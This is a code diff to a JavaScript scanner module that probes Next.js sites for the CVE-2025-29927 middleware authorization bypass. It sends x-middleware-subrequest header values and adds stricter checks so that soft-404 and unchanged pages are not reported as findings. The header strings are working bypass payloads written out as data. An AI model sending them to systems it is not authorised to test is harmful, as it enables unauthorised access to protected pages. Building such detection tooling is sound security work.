@@ -11,6 +11,12 @@ import {
 
 export const tags = ['nextjs'];
 
+function isNextjsSoft404(text) {
+  if (typeof text !== 'string' || !text) return false;
+  const sample = text.slice(0, 65536);
+  return /(?:next-error-h1|<title>\s*404\s*:|This page could not be found|"statusCode"\s*:\s*404)/i.test(sample);
+}
+
 export default async function run(target, fetchWithRetry) {
   const base = target.replace(/\/+$/, '');
   const found = [];
@@ -30,10 +36,24 @@ export default async function run(target, fetchWithRetry) {
         (location && /login/i.test(location));
 
       if (isProtected) {
+        const initialTrimmed = typeof initialRes?.text === 'string' ? initialRes.text.trim() : '';
         const bypassHeaders = [
           'middleware:middleware:middleware:middleware:middleware',
-          'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
+          'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware',
+          'pages/_middleware'
         ];
+
+        const isValidBypassResponse = (r) => {
+          if (!r || r.status !== 200) return false;
+          if (isRedirectedToDifferentPath(r, targetUrl)) return false;
+          if (isFrameworkRouteErrorResponse(r, r.text)) return false;
+          if (typeof r.text !== 'string') return false;
+          const trimmed = r.text.trim();
+          if (trimmed.length === 0) return false;
+          if (isNextjsSoft404(r.text)) return false;
+          if (initialTrimmed && trimmed === initialTrimmed) return false;
+          return true;
+        };
 
         for (const bypassVal of bypassHeaders) {
           try {
@@ -41,28 +61,23 @@ export default async function run(target, fetchWithRetry) {
             const bypassRes = await fetchWithRetry(targetUrl, opts);
             networkSuccess = true;
 
-            if (
-              bypassRes?.status === 200 &&
-              !isRedirectedToDifferentPath(bypassRes, targetUrl) &&
-              !isFrameworkRouteErrorResponse(bypassRes, bypassRes.text) &&
-              bypassRes.text &&
-              bypassRes.text.trim().length > 0
-            ) {
+            if (isValidBypassResponse(bypassRes)) {
               const { confirmed, res: cRes } = await confirmReproducible(
                 targetUrl,
                 fetchWithRetry,
                 opts,
-                (r) =>
-                  r?.status === 200 &&
-                  !isRedirectedToDifferentPath(r, targetUrl) &&
-                  !isFrameworkRouteErrorResponse(r, r.text) &&
-                  typeof r.text === 'string' &&
-                  r.text.trim().length > 0
+                isValidBypassResponse
               );
               if (!confirmed) continue;
 
               const finalRes = cRes || bypassRes;
-              const quote = `x-middleware-subrequest bypassed HTTP ${initialRes.status} -> HTTP 200 on ${path}`;
+              const rawFinalText = typeof finalRes?.text === 'string' ? finalRes.text : '';
+              const normalizedBodyFallback = rawFinalText.replace(/\s+/g, ' ').trim().slice(0, 80);
+              const quote =
+                extractVerbatimSnippet(rawFinalText, /<h1|<title|admin|dashboard/i) ||
+                (normalizedBodyFallback.length >= 8
+                  ? normalizedBodyFallback
+                  : `x-middleware-subrequest: ${bypassVal}`);
               found.push({
                 name         : 'nextjs middleware auth bypass (CVE-2025-29927)',
                 findingStatus: 'VULNERABLE',
@@ -200,9 +215,15 @@ export default async function run(target, fetchWithRetry) {
                : found.some(f => f.severity === 'HIGH')     ? 'HIGH'
                : found.some(f => f.severity === 'MEDIUM')   ? 'MEDIUM'
                : 'LOW';
-  const primary = found[0];
-  const evidenceQuotes = found.map(f => f.preview).filter(q => typeof q === 'string' && q.length >= 8).slice(0, 5);
   const cveHit = found.find(f => f.cve);
+  const primary = cveHit || found[0];
+  const quoteCandidates = primary.trafficId !== undefined
+    ? found.filter(f => f.trafficId === primary.trafficId)
+    : found;
+  const evidenceQuotes = quoteCandidates
+    .map(f => f.preview)
+    .filter(q => typeof q === 'string' && q.trim().length >= 8)
+    .slice(0, 5);
 
   return {
     name          : 'nextjs security',
